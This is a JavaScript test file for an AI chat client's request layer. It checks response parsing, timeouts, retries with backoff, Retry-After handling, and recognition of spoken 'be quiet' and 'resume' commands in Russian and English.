    { ok: false, reason: 'empty' },
  );

  // Unparseable success is still a failure with a reason.
  assert.deepEqual(
    await requestReply({
      resolved,
      system: '',
      messages: [],
      fetchImpl: async () => ({ ok: true, json: async () => { throw new Error('not json'); } }),
    }),
    { ok: false, reason: 'empty' },
  );
});

test("google's compat layer hands back parts, not a string", async () => {
  // Stringifying that array would put [object Object] in the transcript.
  const result = await requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'gemini-2.5-flash', name: 'tailik' },
    system: '',
    messages: [],
    fetchImpl: async () => ({
      ok: true,
      json: async () => ({ choices: [{ message: { content: [{ text: 'port ' }, { text: '22' }] } }] }),
    }),
  });
  assert.deepEqual(result, { ok: true, text: 'port 22' });
});

test('a thinking model that spent the whole budget says so, not "empty"', async () => {
  // The reasoning comes out of max_tokens, so this is a setting to raise, not a
  // model with nothing to say — and the two want different fixes.
  const result = await requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'gemini-2.5-flash', name: 'tailik' },
    system: '',
    messages: [],
    maxTokens: 600,
    fetchImpl: async () => ({
      ok: true,
      json: async () => ({ choices: [{ finish_reason: 'length', message: { content: null } }] }),
    }),
  });
  assert.equal(result.ok, false);
  assert.equal(result.reason, 'cut-off');
  assert.ok(result.detail.includes('600'));
});

test('the token budget leaves room for a thinking model to think', () => {
  // Every current default is a thinking model; a cap sized for the visible
  // answer alone gets eaten before the answer starts.
  assert.ok(AI_MAX_TOKENS >= 2048, `too tight for reasoning: ${AI_MAX_TOKENS}`);
});

test("google's compat layer wraps its body in an array", async () => {
  // Observed live: the one line that says "credits depleted" rather than "429"
  // sits inside a one-element array, and is lost without unwrapping.
  const result = await requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'gemini-2.5-flash', name: 'tailik' },
    system: '',
    messages: [],
    delayImpl: async () => {},
    fetchImpl: async () => ({
      ok: false,
      status: 429,
      json: async () => ([{ error: { code: 429, message: 'Your prepayment credits are depleted.' } }]),
    }),
  });
  assert.deepEqual(result, {
    ok: false, reason: 'http 429', detail: 'Your prepayment credits are depleted.',
  });
});

test('an array-wrapped success is read the same way', async () => {
  const result = await requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'gemini-2.5-flash', name: 'tailik' },
    system: '',
    messages: [],
    fetchImpl: async () => ({
      ok: true,
      json: async () => ([{ choices: [{ message: { content: 'OK' } }] }]),
    }),
  });
  assert.deepEqual(result, { ok: true, text: 'OK' });
});

test('a body that never arrives ends at the deadline, not never', async () => {
  // The provider answered with headers and then stopped. Before the deadline
  // covered the body, this held the caller's in-flight flag for the rest of the
  // session and the AI was dead until restart.
  const result = await requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'm', name: 'tailik' },
    system: '',
    messages: [],
    timeoutMs: 20,
    fetchImpl: async () => ({ ok: true, json: () => new Promise(() => {}) }),
  });
  assert.deepEqual(result, { ok: false, reason: 'timeout-body' });
});

test('/stop is honoured while the body is still being read', async () => {
  const controller = new AbortController();
  const pending = requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'm', name: 'tailik' },
    system: '',
    messages: [],
    signal: controller.signal,
    // Headers land, and then the body hangs: the abort listener has to still be
    // wired at that point for /stop to mean anything.
    fetchImpl: async () => ({ ok: true, json: () => new Promise(() => {}) }),
  });
  await new Promise((resolve) => setTimeout(resolve, 5));
  controller.abort();
  assert.deepEqual(await pending, { ok: false, reason: 'stopped' });
});

test('a provider having a bad minute is asked once more, and answers', async () => {
  const waits = [];
  let calls = 0;
  const result = await requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'm', name: 'tailik' },
    system: '',
    messages: [],
    delayImpl: async (ms) => { waits.push(ms); },
    fetchImpl: async () => {
      calls += 1;
      return calls === 1
        ? { ok: false, status: 500, json: async () => ({ error: { message: 'upstream' } }) }
        : { ok: true, json: async () => ({ choices: [{ message: { content: 'hey' } }] }) };
    },
  });
  assert.deepEqual(result, { ok: true, text: 'hey' });
  assert.equal(calls, 2, 'exactly one retry');
  assert.equal(waits.length, 1);
  assert.ok(waits[0] >= 200 && waits[0] <= 400, `jittered backoff, got ${waits[0]}`);
});

test('a refused request is not repeated, only a throttled or broken one', async () => {
  let calls = 0;
  const result = await requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'm', name: 'tailik' },
    system: '',
    messages: [],
    delayImpl: async () => {},
    fetchImpl: async () => {
      calls += 1;
      return { ok: false, status: 400, json: async () => ({ error: { message: 'no such model' } }) };
    },
  });
  assert.deepEqual(result, { ok: false, reason: 'http 400', detail: 'no such model' });
  assert.equal(calls, 1, 'a bad request repeated is the same bad request');
});

test('a provider that says how long to wait is believed', async () => {
  const waits = [];
  let calls = 0;
  const result = await requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'm', name: 'tailik' },
    system: '',
    messages: [],
    delayImpl: async (ms) => { waits.push(ms); },
    fetchImpl: async () => {
      calls += 1;
      return calls === 1
        ? {
          ok: false,
          status: 429,
          headers: { 'Retry-After': '3' },
          json: async () => ({ error: { message: 'slow down' } }),
        }
        : { ok: true, json: async () => ({ choices: [{ message: { content: 'ok' } }] }) };
    },
  });
  assert.deepEqual(result, { ok: true, text: 'ok' });
  assert.deepEqual(waits, [3000], 'the provider\'s own number, not our backoff');
  assert.equal(calls, 2);
});

test('a retry never pushes the call past the deadline it was given', async () => {
  // One budget covers every attempt. A wait that would outlast it is not a
  // retry, it is a slower way to report the failure already in hand.
  const run = async (timeoutMs) => {
    let clock = 0;
    let calls = 0;
    const waits = [];
    const result = await requestReply({
      resolved: { url: 'http://x', key: 'k', model: 'm', name: 'tailik' },
      system: '',
      messages: [],
      timeoutMs,
      now: () => clock,
      random: () => 1,
      setTimer: () => 0,
      clearTimer: () => {},
      delayImpl: async (ms) => { waits.push(ms); clock += ms; },
      fetchImpl: async () => {
        calls += 1;
        clock += 400;
        return { ok: false, status: 503, json: async () => ({}) };
      },
    });
    return { result, calls, waits, clock };
  };

  const tight = await run(1000);
  assert.deepEqual(tight.result, { ok: false, reason: 'http 503', detail: '' });
  assert.equal(tight.calls, 2, 'the third attempt would have run out of budget');
  assert.deepEqual(tight.waits, [400]);

  const roomy = await run(10_000);
  assert.equal(roomy.calls, AI_RETRIES + 1, 'the bound is attempts, not only time');
  assert.deepEqual(roomy.result, { ok: false, reason: 'http 503', detail: '' });
});

test('a body that is not JSON is nothing to show, not a timeout', async () => {
  // The two want different things from the person reading the line: one is the
  // model with nothing to say, the other sends them looking at their network.
  let calls = 0;
  const result = await requestReply({
    resolved: { url: 'http://x', key: 'k', model: 'm', name: 'tailik' },
    system: '',
    messages: [],
    delayImpl: async () => {},
    fetchImpl: async () => {
      calls += 1;
      return { ok: true, json: async () => { throw new SyntaxError('Unexpected token <'); } };
    },
  });
  assert.deepEqual(result, { ok: false, reason: 'empty' });
  assert.equal(calls, 1, 'a provider that answered is not asked again');
});

test('only throttling and a broken provider are worth a second attempt', () => {
  assert.equal(isRetryableStatus(429), true);
  assert.equal(isRetryableStatus(500), true);
  assert.equal(isRetryableStatus(503), true);
  assert.equal(isRetryableStatus(400), false);
  assert.equal(isRetryableStatus(401), false);
  assert.equal(isRetryableStatus(404), false);
  assert.equal(isRetryableStatus(200), false);
  assert.equal(isRetryableStatus(600), false);
});

test('Retry-After is read as seconds or as a date, and never trusted blindly', () => {
  assert.equal(parseRetryAfter('2'), 2000);
  assert.equal(parseRetryAfter(' 30 '), 30_000);
  assert.equal(parseRetryAfter(null), null);
  assert.equal(parseRetryAfter(''), null);
  assert.equal(parseRetryAfter('soon'), null);
  const now = Date.parse('2026-01-01T00:00:00Z');
  assert.equal(
    parseRetryAfter('Thu, 01 Jan 2026 00:00:05 GMT', { now: () => now }),
    5000,
  );
  // A date already gone is zero, not a negative wait.
  assert.equal(
    parseRetryAfter('Thu, 01 Jan 2026 00:00:00 GMT', { now: () => now + 9000 }),
    0,
  );
});

test('the retry plan stops at the attempt count and at the deadline', () => {
  assert.deepEqual(
    retryPlan({ attempt: 1, attempts: 3, remainingMs: 10_000, random: () => 1 }),
    { retry: true, delayMs: 400 },
  );
  assert.deepEqual(
    retryPlan({ attempt: 2, attempts: 3, remainingMs: 10_000, random: () => 1 }),
    { retry: true, delayMs: 800 },
  );
  assert.deepEqual(
    retryPlan({ attempt: 3, attempts: 3, remainingMs: 10_000 }),
    { retry: false, delayMs: 0 },
  );
  // Half the backoff at the least, so two throttled clients do not collide again.
  assert.deepEqual(
    retryPlan({ attempt: 1, attempts: 3, remainingMs: 10_000, random: () => 0 }),
    { retry: true, delayMs: 200 },
  );
  assert.deepEqual(
    retryPlan({ attempt: 1, attempts: 3, remainingMs: 200, random: () => 1 }),
    { retry: false, delayMs: 0 },
  );
  // A provider asking for longer than the whole budget is asking for silence.
  assert.deepEqual(
    retryPlan({ attempt: 1, attempts: 3, remainingMs: 5000, retryAfterMs: 60_000 }),
    { retry: false, delayMs: 0 },
  );
  assert.deepEqual(
    retryPlan({ attempt: 1, attempts: 3, remainingMs: 5000, retryAfterMs: 1500 }),
    { retry: true, delayMs: 1500 },
  );
  // The ceiling holds however many attempts a caller allows.
  assert.deepEqual(
    retryPlan({ attempt: 8, attempts: 20, remainingMs: 100_000, random: () => 1 }),
    { retry: true, delayMs: 4000 },
  );
});

test('a wait between attempts ends the moment the call is cut off', async () => {
  const controller = new AbortController();
  let cleared = 0;
  const waiting = abortableDelay(60_000, {
    signal: controller.signal,
    clearTimer: (id) => { cleared += 1; clearTimeout(id); },
  });
  controller.abort();
  await waiting;
  assert.equal(cleared, 1, 'the pending timer is not left behind');

  // Already cut off before the wait began: nothing is scheduled at all.
  let scheduled = 0;
  await abortableDelay(60_000, {
    signal: controller.signal,
    setTimer: () => { scheduled += 1; return 0; },
  });
  assert.equal(scheduled, 0);
});

test('a quiet instruction is recognised only when named or said alone', () => {
  // The words the terminal's tailik and the cloud bridge both obey, so an
  // assistant silenced in one client cannot keep talking in the other.
  assert.equal(AI_QUIET_MS, 15 * 60 * 1000);
  for (const said of ['помолчи', 'замолчи', 'молчи', 'стоп', 'тише', 'заткнись', 'be quiet', 'shut up', 'silence', 'stop']) {
    assert.equal(AI_QUIET_WORDS.test(said), true, said);
    assert.equal(isBareInstruction(said, AI_QUIET_WORDS), true, said);
  }
  for (const said of ['говори', 'отвечай', 'продолжай', 'speak', 'talk', 'resume', 'unmute']) {
    assert.equal(AI_RESUME_WORDS.test(said), true, said);
    assert.equal(isBareInstruction(said, AI_RESUME_WORDS), true, said);
  }
  // Punctuation and a name still leave it a bare instruction.
  assert.equal(isBareInstruction('Стоп!', AI_QUIET_WORDS), true);
  assert.equal(isBareInstruction('тайлик, стоп', AI_QUIET_WORDS), true);
  // A sentence between two people is not: «стоп» is an ordinary word, and
  // silencing the assistant by accident is the failure worth avoiding.
  assert.equal(isBareInstruction('стоп я забыл сказать самое главное', AI_QUIET_WORDS), false);
  assert.equal(isBareInstruction('давай продолжай этот проект завтра', AI_RESUME_WORDS), false);
  assert.equal(isBareInstruction('', AI_QUIET_WORDS), false);
  assert.equal(isBareInstruction('   ', AI_QUIET_WORDS), false);
  // A word inside another word is not the word.
  assert.equal(AI_QUIET_WORDS.test('stopwatch'), false);
  assert.equal(AI_QUIET_WORDS.test('нестоповый'), true, 'a Russian stem is matched by design');
});
